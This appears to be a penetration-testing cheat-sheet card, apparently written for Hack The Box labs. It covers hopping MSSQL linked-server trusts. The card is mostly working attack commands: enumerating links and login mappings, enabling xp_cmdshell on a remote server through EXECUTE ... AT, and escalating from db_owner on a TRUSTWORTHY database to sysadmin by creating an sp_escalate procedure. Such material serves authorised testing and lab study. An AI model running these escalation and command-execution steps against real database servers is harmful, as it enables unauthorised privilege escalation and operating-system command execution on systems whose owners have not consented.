# 14.11 MSSQL Linked Servers Cross-Trust

> Hop MSSQL linked-server trusts via mapped logins or TRUSTWORTHY+db_owner → `sp_escalate` → sysadmin → `xp_cmdshell`.

## Overview

The existing card is missing the trustworthy database escalation path and the full Linux (mssqlclient.py) workflow. Expand with both privilege paths: (1) direct sysadmin via mapped login, and (2) db_owner on a TRUSTWORTHY database → stored procedure sp_escalate → sysadmin → xp_cmdshell.

## Steps

- **Get-SQLServerLink** or **mssqlclient.py enum_links** — enumerate links and login mappings
- **EXEC sp_helplinkedsrvlogin** — confirm which domain user maps to which remote login
- If mapped as sysadmin (sa): enable xp_cmdshell with **EXECUTE('sp_configure ...) AT** and run commands
- If only public role: check for TRUSTWORTHY databases, confirm db_owner with **sp_helpuser** / **enum_users**
- If db_owner on TRUSTWORTHY db: **CREATE PROCEDURE sp_escalate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember** → run it → now sysadmin
- Enable xp_cmdshell and execute OS commands

## Commands

### PowerUpSQL enum links

```powershell
PS C:\Tools> import-module .\PowerUpSQL.ps1
```

### PowerUpSQL enum login rights

```powershell
PS C:\Tools> Get-SQLQuery  -Query "EXEC sp_helplinkedsrvlogin"
```

### Check sysadmin rights

```text
select * from openquery("SQL02\SQLEXPRESS",'select IS_SRVROLEMEMBER(''sysadmin'')')
```

### Enable xp_cmdshell (Windows SSMS)

```text
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "SQL02\SQLEXPRESS"
```

### Execute whoami via xp_cmdshell

```text
EXECUTE('xp_cmdshell "whoami"') AT "SQL02\SQLEXPRESS"
```

### Check trustworthy databases

```text
select * from openquery("SQL02\SQLEXPRESS",'SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;')
```

### Escalate via stored procedure

```text
EXEC ('CREATE PROCEDURE sp_escalate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember ''htb-dbuser'',''sysadmin''') AT "SQL02\SQLEXPRESS"
```

### Execute sp_escalate

```text
EXEC ('sp_escalate;SELECT IS_SRVROLEMEMBER(''sysadmin'');SELECT SUSER_NAME()') AT "SQL02\SQLEXPRESS"
```

### mssqlclient.py connect (Linux)

```bash
mssqlclient.py [email protected] -windows-auth
```

### mssqlclient enum links

```text
SQL (<DOMAIN>\jimmy  guest@master)> enum_links
```

### mssqlclient use_link and enable xp_cmdshell

```text
SQL (<DOMAIN>\jimmy  guest@master)> use_link "SQL02\SQLEXPRESS"
```

### mssqlclient trustworthy db abuse (Linux)

```text
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@msdb)> USE "htb-reports"
```

### mssqlclient enable xp_cmdshell (Linux)

```text
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  dbo@msdb)> exec master.dbo.sp_configure "show advanced options",1;RECONFIGURE;exec master.dbo.sp_configure "xp_cmdshell", 1;RECONFIGURE;
```
